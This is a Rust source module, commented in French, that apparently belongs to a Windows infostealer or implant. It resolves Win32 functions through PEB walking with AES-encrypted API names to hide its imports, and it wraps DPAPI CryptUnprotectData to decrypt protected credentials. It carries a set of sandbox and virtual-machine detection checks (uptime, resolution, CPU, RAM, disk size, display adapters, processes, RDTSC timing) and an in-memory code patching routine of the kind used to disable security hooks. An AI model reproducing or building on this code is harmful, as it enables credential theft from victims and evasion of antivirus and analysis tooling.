//! Phase 5: Toutes les API Win32 résolues via PEB walking + parsing PE (inject::syscall).
//! Aucun import IAT direct. Cache OnceLock lazy.
//! Toutes les chaînes de résolution sont chiffrées AES-256-GCM compile-time (clé unique par build).

#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::mem;
use std::sync::OnceLock;
use std::os::windows::ffi::OsStrExt;

use crate::polymorphic_keys::aes_decrypt;
use crate::polymorphic_keys::{
    CRYPTUNPROTECTDATA_ENC_KEY, CRYPTUNPROTECTDATA_ENC_NONCE, CRYPTUNPROTECTDATA_ENC_CT,
    LOCALFREE_ENC_KEY, LOCALFREE_ENC_NONCE, LOCALFREE_ENC_CT,
    GETTICKCOUNT64_ENC_KEY, GETTICKCOUNT64_ENC_NONCE, GETTICKCOUNT64_ENC_CT,
    GETSYSTEMINFO_ENC_KEY, GETSYSTEMINFO_ENC_NONCE, GETSYSTEMINFO_ENC_CT,
    GLOBALMEMORYSTATUSEX_ENC_KEY, GLOBALMEMORYSTATUSEX_ENC_NONCE, GLOBALMEMORYSTATUSEX_ENC_CT,
    LOADLIBRARYW_ENC_KEY, LOADLIBRARYW_ENC_NONCE, LOADLIBRARYW_ENC_CT,
    MESSAGEBOXW_ENC_KEY, MESSAGEBOXW_ENC_NONCE, MESSAGEBOXW_ENC_CT,
    GETSYSTEMMETRICS_ENC_KEY, GETSYSTEMMETRICS_ENC_NONCE, GETSYSTEMMETRICS_ENC_CT,
    CRYPT32_DLL_ENC_KEY, CRYPT32_DLL_ENC_NONCE, CRYPT32_DLL_ENC_CT,
    KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE, KERNEL32_DLL_ENC_CT,
    USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE, USER32_DLL_ENC_CT,
    ADVAPI32_DLL_ENC_KEY, ADVAPI32_DLL_ENC_NONCE, ADVAPI32_DLL_ENC_CT,
    REGOPENKEYEXW_ENC_KEY, REGOPENKEYEXW_ENC_NONCE, REGOPENKEYEXW_ENC_CT,
    REGCLOSEKEY_ENC_KEY, REGCLOSEKEY_ENC_NONCE, REGCLOSEKEY_ENC_CT,
    GETCURSORPOS_ENC_KEY, GETCURSORPOS_ENC_NONCE, GETCURSORPOS_ENC_CT,
    GETFOREGROUNDWINDOW_ENC_KEY, GETFOREGROUNDWINDOW_ENC_NONCE, GETFOREGROUNDWINDOW_ENC_CT,
    ENUMDISPLAYDEVICESW_ENC_KEY, ENUMDISPLAYDEVICESW_ENC_NONCE, ENUMDISPLAYDEVICESW_ENC_CT,
    CREATETOOLHELP32SNAPSHOT_ENC_KEY, CREATETOOLHELP32SNAPSHOT_ENC_NONCE, CREATETOOLHELP32SNAPSHOT_ENC_CT,
    PROCESS32FIRSTW_ENC_KEY, PROCESS32FIRSTW_ENC_NONCE, PROCESS32FIRSTW_ENC_CT,
    PROCESS32NEXTW_ENC_KEY, PROCESS32NEXTW_ENC_NONCE, PROCESS32NEXTW_ENC_CT,
    CLOSEHANDLE_ENC_KEY, CLOSEHANDLE_ENC_NONCE, CLOSEHANDLE_ENC_CT,
    OPENPROCESS_ENC_KEY, OPENPROCESS_ENC_NONCE, OPENPROCESS_ENC_CT,
    QUERYFULLPROCESSIMAGENAMEW_ENC_KEY, QUERYFULLPROCESSIMAGENAMEW_ENC_NONCE, QUERYFULLPROCESSIMAGENAMEW_ENC_CT,
    NTDLL_DLL_ENC_KEY, NTDLL_DLL_ENC_NONCE, NTDLL_DLL_ENC_CT,
    NTQUERYSYSTEMINFORMATION_ENC_KEY, NTQUERYSYSTEMINFORMATION_ENC_NONCE, NTQUERYSYSTEMINFORMATION_ENC_CT,
    GETDISKFREESPACEEXW_ENC_KEY, GETDISKFREESPACEEXW_ENC_NONCE, GETDISKFREESPACEEXW_ENC_CT,
    GETVOLUMEINFORMATIONW_ENC_KEY, GETVOLUMEINFORMATIONW_ENC_NONCE, GETVOLUMEINFORMATIONW_ENC_CT,
    GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT,
    VIRTUALPROTECT_ENC_KEY, VIRTUALPROTECT_ENC_NONCE, VIRTUALPROTECT_ENC_CT,
    FLUSHINSTRUCTION_ENC_KEY, FLUSHINSTRUCTION_ENC_NONCE, FLUSHINSTRUCTION_ENC_CT,
    GETCURRENTPROCESS_ENC_KEY, GETCURRENTPROCESS_ENC_NONCE, GETCURRENTPROCESS_ENC_CT,
};

// ── Types Windows nécessaires (définis manuellement) ──

#[repr(C)]
pub struct CRYPT_INTEGER_BLOB {
    pub cbData: u32,
    pub pbData: *mut u8,
}

#[repr(C)]
pub struct POINT {
    pub x: i32,
    pub y: i32,
}

#[repr(C)]
pub struct DISPLAY_DEVICEW {
    pub cb: u32,
    pub DeviceName: [u16; 32],
    pub DeviceString: [u16; 128],
    pub StateFlags: u32,
    pub DeviceID: [u16; 128],
    pub DeviceKey: [u16; 128],
}

#[repr(C)]
pub struct PROCESSENTRY32W {
    pub dwSize: u32,
    pub cntUsage: u32,
    pub th32ProcessID: u32,
    pub th32DefaultHeapID: usize,
    pub th32ModuleID: u32,
    pub cntThreads: u32,
    pub th32ParentProcessID: u32,
    pub pcPriClassBase: i32,
    pub dwFlags: u32,
    pub szExeFile: [u16; 260],
}

pub const TH32CS_SNAPPROCESS: u32 = 0x00000002;
pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
pub const HKEY_LOCAL_MACHINE: *mut u8 = 0x80000002u64 as *mut u8;
pub const HKEY_CURRENT_USER: *mut u8 = 0x80000001u64 as *mut u8;
pub const KEY_READ: u32 = 0x20019;
pub const DISPLAY_DEVICE_ACTIVE: u32 = 0x1;
pub const SystemProcessInformation: u32 = 5;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const PAGE_EXECUTE_READ: u32 = 0x20;

#[repr(C)]
pub struct SYSTEM_INFO {
    pub wProcessorArchitecture: u16,
    pub wReserved: u16,
    pub dwPageSize: u32,
    pub lpMinimumApplicationAddress: *mut u8,
    pub lpMaximumApplicationAddress: *mut u8,
    pub dwActiveProcessorMask: u64,
    pub dwNumberOfProcessors: u32,
    pub dwProcessorType: u32,
    pub dwAllocationGranularity: u32,
    pub wProcessorLevel: u16,
    pub wProcessorRevision: u16,
}

#[repr(C)]
pub struct MEMORYSTATUSEX {
    pub dwLength: u32,
    pub dwMemoryLoad: u32,
    pub ullTotalPhys: u64,
    pub ullAvailPhys: u64,
    pub ullTotalPageFile: u64,
    pub ullAvailPageFile: u64,
    pub ullTotalVirtual: u64,
    pub ullAvailVirtual: u64,
    pub ullAvailExtendedVirtual: u64,
}

// ── Résolution DLL + export ──

fn ensure_dll_loaded(dll_name: &str) {
    unsafe {
        let k32_name = String::from_utf8_lossy(
            &aes_decrypt(KERNEL32_DLL_ENC_CT, &KERNEL32_DLL_ENC_KEY, &KERNEL32_DLL_ENC_NONCE)
        ).into_owned();
        let kernel32 = inject::syscall::get_module_base(&k32_name)
            .unwrap_or(std::ptr::null_mut());
        if kernel32.is_null() { return; }
        let ll_name = String::from_utf8_lossy(
            &aes_decrypt(LOADLIBRARYW_ENC_CT, &LOADLIBRARYW_ENC_KEY, &LOADLIBRARYW_ENC_NONCE)
        ).into_owned();
        let addr = inject::syscall::resolve_export(kernel32, &ll_name)
            .unwrap_or(std::ptr::null_mut());
        if addr.is_null() { return; }
        type F = unsafe extern "system" fn(*const u16) -> *mut u8;
        let loadlib: F = mem::transmute(addr);
        let wide: Vec<u16> = std::ffi::OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
        loadlib(wide.as_ptr());
    }
}

macro_rules! declare_api {
    ($name:ident,
     $dll_ct:expr, $dll_key:expr, $dll_nonce:expr,
     $func_ct:expr, $func_key:expr, $func_nonce:expr,
     $ty:ty) => {
        pub fn $name() -> Option<$ty> {
            static CACHE: OnceLock<Option<$ty>> = OnceLock::new();
            *CACHE.get_or_init(|| unsafe {
                let dll_name = String::from_utf8_lossy(
                    &aes_decrypt($dll_ct, &$dll_key, &$dll_nonce)
                ).into_owned();
                let func_name = String::from_utf8_lossy(
                    &aes_decrypt($func_ct, &$func_key, &$func_nonce)
                ).into_owned();
                if inject::syscall::get_module_base(&dll_name).is_none() {
                    ensure_dll_loaded(&dll_name);
                }
                let base = match inject::syscall::get_module_base(&dll_name) {
                    Some(b) => b,
                    None => return None,
                };
                let addr = match inject::syscall::resolve_export(base, &func_name) {
                    Some(a) => a,
                    None => return None,
                };
                Some(mem::transmute::<*mut u8, $ty>(addr))
            })
        }
    };
}

declare_api!(CryptUnprotectData,
    CRYPT32_DLL_ENC_CT,   CRYPT32_DLL_ENC_KEY,   CRYPT32_DLL_ENC_NONCE,
    CRYPTUNPROTECTDATA_ENC_CT, CRYPTUNPROTECTDATA_ENC_KEY, CRYPTUNPROTECTDATA_ENC_NONCE,
    unsafe extern "system" fn(*mut CRYPT_INTEGER_BLOB, *mut u16, *mut CRYPT_INTEGER_BLOB, *mut u8, *mut u8, u32, *mut CRYPT_INTEGER_BLOB) -> i32);

declare_api!(LocalFree,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    LOCALFREE_ENC_CT,    LOCALFREE_ENC_KEY,    LOCALFREE_ENC_NONCE,
    unsafe extern "system" fn(*mut u8) -> *mut u8);

declare_api!(MessageBoxW,
    USER32_DLL_ENC_CT,   USER32_DLL_ENC_KEY,   USER32_DLL_ENC_NONCE,
    MESSAGEBOXW_ENC_CT,  MESSAGEBOXW_ENC_KEY,  MESSAGEBOXW_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, *const u16, *const u16, u32) -> i32);

declare_api!(GetSystemMetrics,
    USER32_DLL_ENC_CT,        USER32_DLL_ENC_KEY,        USER32_DLL_ENC_NONCE,
    GETSYSTEMMETRICS_ENC_CT,  GETSYSTEMMETRICS_ENC_KEY,  GETSYSTEMMETRICS_ENC_NONCE,
    unsafe extern "system" fn(i32) -> i32);

declare_api!(GetTickCount64,
    KERNEL32_DLL_ENC_CT,   KERNEL32_DLL_ENC_KEY,   KERNEL32_DLL_ENC_NONCE,
    GETTICKCOUNT64_ENC_CT, GETTICKCOUNT64_ENC_KEY, GETTICKCOUNT64_ENC_NONCE,
    unsafe extern "system" fn() -> u64);

declare_api!(GetSystemInfo,
    KERNEL32_DLL_ENC_CT,  KERNEL32_DLL_ENC_KEY,  KERNEL32_DLL_ENC_NONCE,
    GETSYSTEMINFO_ENC_CT, GETSYSTEMINFO_ENC_KEY, GETSYSTEMINFO_ENC_NONCE,
    unsafe extern "system" fn(*mut SYSTEM_INFO));

declare_api!(GlobalMemoryStatusEx,
    KERNEL32_DLL_ENC_CT,         KERNEL32_DLL_ENC_KEY,         KERNEL32_DLL_ENC_NONCE,
    GLOBALMEMORYSTATUSEX_ENC_CT, GLOBALMEMORYSTATUSEX_ENC_KEY, GLOBALMEMORYSTATUSEX_ENC_NONCE,
    unsafe extern "system" fn(*mut MEMORYSTATUSEX) -> i32);

declare_api!(RegOpenKeyExW,
    ADVAPI32_DLL_ENC_CT, ADVAPI32_DLL_ENC_KEY, ADVAPI32_DLL_ENC_NONCE,
    REGOPENKEYEXW_ENC_CT, REGOPENKEYEXW_ENC_KEY, REGOPENKEYEXW_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, *const u16, u32, u32, *mut *mut u8) -> i32);

declare_api!(RegCloseKey,
    ADVAPI32_DLL_ENC_CT, ADVAPI32_DLL_ENC_KEY, ADVAPI32_DLL_ENC_NONCE,
    REGCLOSEKEY_ENC_CT, REGCLOSEKEY_ENC_KEY, REGCLOSEKEY_ENC_NONCE,
    unsafe extern "system" fn(*mut u8) -> i32);

declare_api!(GetCursorPos,
    USER32_DLL_ENC_CT, USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE,
    GETCURSORPOS_ENC_CT, GETCURSORPOS_ENC_KEY, GETCURSORPOS_ENC_NONCE,
    unsafe extern "system" fn(*mut POINT) -> i32);

declare_api!(GetForegroundWindow,
    USER32_DLL_ENC_CT, USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE,
    GETFOREGROUNDWINDOW_ENC_CT, GETFOREGROUNDWINDOW_ENC_KEY, GETFOREGROUNDWINDOW_ENC_NONCE,
    unsafe extern "system" fn() -> *mut u8);

declare_api!(EnumDisplayDevicesW,
    USER32_DLL_ENC_CT, USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE,
    ENUMDISPLAYDEVICESW_ENC_CT, ENUMDISPLAYDEVICESW_ENC_KEY, ENUMDISPLAYDEVICESW_ENC_NONCE,
    unsafe extern "system" fn(*const u16, u32, *mut DISPLAY_DEVICEW, u32) -> i32);

declare_api!(CreateToolhelp32Snapshot,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    CREATETOOLHELP32SNAPSHOT_ENC_CT, CREATETOOLHELP32SNAPSHOT_ENC_KEY, CREATETOOLHELP32SNAPSHOT_ENC_NONCE,
    unsafe extern "system" fn(u32, u32) -> *mut u8);

declare_api!(Process32FirstW,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    PROCESS32FIRSTW_ENC_CT, PROCESS32FIRSTW_ENC_KEY, PROCESS32FIRSTW_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, *mut PROCESSENTRY32W) -> i32);

declare_api!(Process32NextW,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    PROCESS32NEXTW_ENC_CT, PROCESS32NEXTW_ENC_KEY, PROCESS32NEXTW_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, *mut PROCESSENTRY32W) -> i32);

declare_api!(CloseHandle,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    CLOSEHANDLE_ENC_CT, CLOSEHANDLE_ENC_KEY, CLOSEHANDLE_ENC_NONCE,
    unsafe extern "system" fn(*mut u8) -> i32);

declare_api!(OpenProcess,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    OPENPROCESS_ENC_CT, OPENPROCESS_ENC_KEY, OPENPROCESS_ENC_NONCE,
    unsafe extern "system" fn(u32, i32, u32) -> *mut u8);

declare_api!(QueryFullProcessImageNameW,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    QUERYFULLPROCESSIMAGENAMEW_ENC_CT, QUERYFULLPROCESSIMAGENAMEW_ENC_KEY, QUERYFULLPROCESSIMAGENAMEW_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, u32, *mut u16, *mut u32) -> i32);

declare_api!(NtQuerySystemInformation,
    NTDLL_DLL_ENC_CT, NTDLL_DLL_ENC_KEY, NTDLL_DLL_ENC_NONCE,
    NTQUERYSYSTEMINFORMATION_ENC_CT, NTQUERYSYSTEMINFORMATION_ENC_KEY, NTQUERYSYSTEMINFORMATION_ENC_NONCE,
    unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32);

declare_api!(GetDiskFreeSpaceExW,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    GETDISKFREESPACEEXW_ENC_CT, GETDISKFREESPACEEXW_ENC_KEY, GETDISKFREESPACEEXW_ENC_NONCE,
    unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32);

declare_api!(GetVolumeInformationW,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    GETVOLUMEINFORMATIONW_ENC_CT, GETVOLUMEINFORMATIONW_ENC_KEY, GETVOLUMEINFORMATIONW_ENC_NONCE,
    unsafe extern "system" fn(*const u16, *mut u16, u32, *mut u32, *mut u32, *mut u32, *mut u16, u32) -> i32);

declare_api!(GetPhysicallyInstalledSystemMemory,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE,
    unsafe extern "system" fn(*mut u64) -> i32);

declare_api!(VirtualProtect,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    VIRTUALPROTECT_ENC_CT, VIRTUALPROTECT_ENC_KEY, VIRTUALPROTECT_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32);

declare_api!(FlushInstructionCache,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    FLUSHINSTRUCTION_ENC_CT, FLUSHINSTRUCTION_ENC_KEY, FLUSHINSTRUCTION_ENC_NONCE,
    unsafe extern "system" fn(*mut u8, *const u8, usize) -> i32);

declare_api!(GetCurrentProcess,
    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
    GETCURRENTPROCESS_ENC_CT, GETCURRENTPROCESS_ENC_KEY, GETCURRENTPROCESS_ENC_NONCE,
    unsafe extern "system" fn() -> *mut u8);

// ── Fonctions utilitaires ──

pub const MB_OK: u32 = 0;
pub const MB_ICONINFORMATION: u32 = 0x40;
pub const MB_ICONERROR: u32 = 0x10;
pub const SM_CXSCREEN: i32 = 0;
pub const SM_CYSCREEN: i32 = 1;
pub const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

pub fn dpapi_decrypt(data: &[u8], flags: u32) -> Option<Vec<u8>> {
    let func = CryptUnprotectData()?;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if func(&mut input, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), flags, &mut output) == 0 {
            return None;
        }
        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        if let Some(lf) = LocalFree() {
            lf(output.pbData);
        }
        Some(slice)
    }
}

pub fn dpapi_decrypt_with_entropy(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    let func = CryptUnprotectData()?;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let mut ent_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let ent_ptr = match entropy {
            Some(e) => {
                ent_blob.cbData = e.len() as u32;
                ent_blob.pbData = e.as_ptr() as *mut u8;
                &mut ent_blob as *mut CRYPT_INTEGER_BLOB
            }
            None => std::ptr::null_mut(),
        };
        if func(&mut input, std::ptr::null_mut(), ent_ptr, std::ptr::null_mut(), std::ptr::null_mut(), flags, &mut output) == 0 {
            return None;
        }
        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        if let Some(lf) = LocalFree() {
            lf(output.pbData);
        }
        Some(slice)
    }
}

pub fn message_box(title: &str, text: &str, style: u32) {
    let func = match MessageBoxW() {
        Some(f) => f,
        None => return,
    };
    let title_wide: Vec<u16> = std::ffi::OsStr::new(title).encode_wide().chain(Some(0)).collect();
    let text_wide: Vec<u16> = std::ffi::OsStr::new(text).encode_wide().chain(Some(0)).collect();
    unsafe {
        func(std::ptr::null_mut(), text_wide.as_ptr(), title_wide.as_ptr(), style);
    }
}

pub fn get_system_metrics(index: i32) -> i32 {
    match GetSystemMetrics() {
        Some(f) => unsafe { f(index) },
        None => {
            match index {
                SM_CXSCREEN => 1920,
                SM_CYSCREEN => 1080,
                _ => 0,
            }
        }
    }
}

pub fn get_tick_count64() -> u64 {
    match GetTickCount64() {
        Some(f) => unsafe { f() },
        None => {
            use std::time::{SystemTime, UNIX_EPOCH};
            SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_millis() as u64
        }
    }
}

pub fn check_uptime() -> bool {
    get_tick_count64() > 300_000
}

pub fn check_resolution() -> bool {
    let cx = get_system_metrics(SM_CXSCREEN);
    let cy = get_system_metrics(SM_CYSCREEN);
    cx >= 800 && cy >= 600
}

pub fn get_system_info() -> SYSTEM_INFO {
    unsafe {
        let mut si: SYSTEM_INFO = mem::zeroed();
        if let Some(f) = GetSystemInfo() {
            f(&mut si);
        } else {
            si.dwNumberOfProcessors = 4;
            si.dwPageSize = 4096;
        }
        si
    }
}

pub fn check_cpu_count() -> bool {
    let si = get_system_info();
    si.dwNumberOfProcessors > 2
}

pub fn check_ram() -> bool {
    unsafe {
        let mut ms: MEMORYSTATUSEX = mem::zeroed();
        ms.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
        if let Some(f) = GlobalMemoryStatusEx() {
            f(&mut ms);
            ms.ullTotalPhys > 4_000_000_000
        } else {
            true
        }
    }
}

/// Returns true if a registry key exists (opens and immediately closes it).
pub fn reg_key_exists(hive: *mut u8, subkey: &str) -> bool {
    let func = match RegOpenKeyExW() {
        Some(f) => f,
        None => return false,
    };
    let close = match RegCloseKey() {
        Some(f) => f,
        None => return false,
    };
    let wide: Vec<u16> = std::ffi::OsStr::new(subkey).encode_wide().chain(Some(0)).collect();
    let mut hkey: *mut u8 = std::ptr::null_mut();
    unsafe {
        let ret = func(hive, wide.as_ptr(), 0, KEY_READ, &mut hkey);
        if ret == 0 {
            close(hkey);
            true
        } else {
            false
        }
    }
}

/// Returns the current cursor position.
pub fn get_cursor_pos() -> Option<POINT> {
    let func = GetCursorPos()?;
    let mut pt = POINT { x: 0, y: 0 };
    unsafe {
        if func(&mut pt) != 0 {
            Some(pt)
        } else {
            None
        }
    }
}

/// Returns true if a foreground window is set (not null/invalid).
pub fn has_foreground_window() -> bool {
    match GetForegroundWindow() {
        Some(f) => unsafe { !f().is_null() },
        None => true,
    }
}

/// Returns true if display adapter string contains any of the given substrings.
pub fn display_device_contains(needles: &[&str]) -> bool {
    let func = match EnumDisplayDevicesW() {
        Some(f) => f,
        None => return false,
    };
    unsafe {
        let mut i = 0u32;
        loop {
            let mut dd: DISPLAY_DEVICEW = mem::zeroed();
            dd.cb = mem::size_of::<DISPLAY_DEVICEW>() as u32;
            let ret = func(std::ptr::null(), i, &mut dd, 0);
            if ret == 0 { break; }
            let dev_str = String::from_utf16_lossy(
                &dd.DeviceString[..dd.DeviceString.iter().position(|&c| c == 0).unwrap_or(128)]
            ).to_lowercase();
            for needle in needles {
                if dev_str.contains(&needle.to_lowercase()) {
                    return true;
                }
            }
            i += 1;
        }
    }
    false
}

/// Enumerate running processes, calling `cb` with lowercased exe name for each.
/// Returns early if `cb` returns true (found a match).
pub fn enum_processes<F: Fn(&str) -> bool>(cb: F) -> bool {
    let snap_fn = match CreateToolhelp32Snapshot() {
        Some(f) => f,
        None => return false,
    };
    let first_fn = match Process32FirstW() {
        Some(f) => f,
        None => return false,
    };
    let next_fn = match Process32NextW() {
        Some(f) => f,
        None => return false,
    };
    let close_fn = match CloseHandle() {
        Some(f) => f,
        None => return false,
    };
    unsafe {
        let snap = snap_fn(TH32CS_SNAPPROCESS, 0);
        let invalid = !0usize as *mut u8;
        if snap.is_null() || snap == invalid { return false; }
        let mut pe: PROCESSENTRY32W = mem::zeroed();
        pe.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
        let mut found = false;
        if first_fn(snap, &mut pe) != 0 {
            loop {
                let name_len = pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name = String::from_utf16_lossy(&pe.szExeFile[..name_len]).to_lowercase();
                if cb(&name) {
                    found = true;
                    break;
                }
                pe = mem::zeroed();
                pe.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
                if next_fn(snap, &mut pe) == 0 { break; }
            }
        }
        close_fn(snap);
        found
    }
}

/// Get total disk size of the system drive (C:\) in bytes. Returns 0 on failure.
pub fn get_system_disk_size() -> u64 {
    let func = match GetDiskFreeSpaceExW() {
        Some(f) => f,
        None => return 0,
    };
    let path: Vec<u16> = std::ffi::OsStr::new("C:\\").encode_wide().chain(Some(0)).collect();
    let mut _free_caller: u64 = 0;
    let mut total: u64 = 0;
    let mut _free_total: u64 = 0;
    unsafe {
        func(path.as_ptr(), &mut _free_caller, &mut total, &mut _free_total);
    }
    total
}

/// Get physical RAM size in bytes using GetPhysicallyInstalledSystemMemory.
pub fn get_physical_ram_kb() -> u64 {
    let func = match GetPhysicallyInstalledSystemMemory() {
        Some(f) => f,
        None => return 0,
    };
    let mut kb: u64 = 0;
    unsafe { func(&mut kb); }
    kb
}

/// RDTSC-based timing: measure overhead of a no-op loop.
/// On a real machine this is very fast; under hypervisors there is often
/// measurable overhead due to VM exits on RDTSC emulation.
#[cfg(target_arch = "x86_64")]
pub fn rdtsc_timing_check() -> u64 {
    unsafe {
        let t1 = core::arch::x86_64::_rdtsc();
        // Tiny busy loop — just enough to measure relative overhead
        core::arch::asm!("nop", "nop", "nop", "nop", options(nostack, nomem));
        let t2 = core::arch::x86_64::_rdtsc();
        t2.wrapping_sub(t1)
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub fn rdtsc_timing_check() -> u64 { 0 }

/// Patch `len` bytes at `addr` with `patch`, using VirtualProtect to toggle
/// page permissions. Returns true on success.
pub fn patch_memory(addr: *mut u8, patch: &[u8]) -> bool {
    let vp = match VirtualProtect() {
        Some(f) => f,
        None => return false,
    };
    let flush = match FlushInstructionCache() {
        Some(f) => f,
        None => return false,
    };
    let proc = match GetCurrentProcess() {
        Some(f) => f,
        None => return false,
    };
    unsafe {
        let mut old_prot: u32 = 0;
        if vp(addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_prot) == 0 {
            return false;
        }
        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
        vp(addr, patch.len(), old_prot, &mut old_prot);
        flush(proc(), addr as *const u8, patch.len());
        true
    }
}

/// Resolve a function address from a DLL loaded in the current process.
/// Uses PEB walking — no GetModuleHandle/GetProcAddress in the IAT.
pub fn resolve_fn(dll: &str, func: &str) -> Option<*mut u8> {
    let base = inject::syscall::get_module_base(dll)?;
    inject::syscall::resolve_export(base, func)
}
